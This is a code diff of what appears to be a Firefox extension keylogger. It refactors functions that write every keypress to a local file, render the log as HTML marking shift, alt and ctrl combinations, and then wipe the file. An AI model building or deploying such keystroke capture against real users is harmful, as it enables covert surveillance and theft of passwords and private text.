@@ -18,7 +18,7 @@ var keylog=new fff_namespace.fff();
 function isNumber(n) {
   return !isNaN(parseFloat(n)) && isFinite(n);
 }
-////////////////////////////////////////////////////////////////////////////////////
+
 keylog.logKeypress=function(e) {
 	var file = Components.classes["@mozilla.org/file/local;1"]
 						 .createInstance(Components.interfaces.nsILocalFile);
@@ -42,7 +42,7 @@ keylog.logKeypress=function(e) {
 	foStream.write(data, data.length);
 	foStream.close();
 }
-////////////////////////////////////////////////////////////////////////////////////////////////
+
 keylog.present_log=function() {
 
 	var pass="",
@@ -99,16 +99,19 @@ keylog.present_log=function() {
 	//writing the log file to a designed HTML file
 	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8">'
 	+'<style>'
-	+'i {font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
-	+'i i {border:none;padding:0;margin:0} '
-	+'i[bs]:after {color:red;content:"BS"} '
-	+'i[tab]:after {color:gray;content:"tab"} '
-	+'i[shift] {color:green;} '
-	+'i[shift]:before {color:gray;content:"shift+"} '
-	+'i[alt] {color:green;} '
-	+'i[alt]:before {color:gray;content:"alt+"} '
-	+'i[ctrl] {color:green;} '
-	+'i[ctrl]:before {color:gray;content:"ctrl+"} '
+	+'i{font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
+	+'i i{border:none;padding:0;margin:0} '
+	+'i[bs]:after{color:red;content:"BS"} '
+	+'i[tab]:after{color:gray;content:"tab"} '
+	+'i[shift]:before{content:"shift+"} '
+	+'i[alt]:before{content:"alt+"} '
+	+'i[ctrl]:before{content:"ctrl+"} '
+	+'i[shift],i[alt],i[ctrl],i[shiftctrl],i[shiftaltctrl],i[shiftalt],i[altctrl] {color:green}'
+	+'i[shiftctrl]:before {content:"shift+ctrl+"} '
+	+'i[shiftaltctrl]:before {content:"shift+alt+ctrl+"} '
+	+'i[shiftalt]:before {content:"shift+alt+"} '
+	+'i[altctrl]:before {content:"alt+ctrl+"} '
+
 	+'</style></head><body style="font-family:monospace;line-height:20px;font-size:13px">' + "\n";
 
 	for(var y=0, begin_segment=0, len=String(str).length, charrr='', charrrAfter=''; y<len; y++)
@@ -140,13 +143,21 @@ keylog.present_log=function() {
 
 	 }
 	}
-tmp_str += "\n</body></html>";
+	tmp_str += "\n</body></html>";
+	
+	return tmp_str;
+};
 
+keylog.show_present_log=function(){
+	tmp_str = keylog.present_log();
 	//not stored in history
 
 	var win=window.open('data:text/html;charset=utf-8,' + encodeURIComponent(tmp_str), 'log');
+	keylog.clear_log();
 	win.focus();
+};
 
+keylog.clear_log=function(){
 	//delete the contents of the log file
 	var file = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile);
 	file.initWithPath(keylog.f);
@@ -157,9 +168,8 @@ tmp_str += "\n</body></html>";
 	foStream.write("", 0);
 	foStream.close();
 };
-////////////////////////////////////////////////////////////////////////////////////////////////
 
-if ("undefined" == typeof(fff))
+if (typeof(fff) === "undefined")
 {
 	var fff = {
 		init : function() {
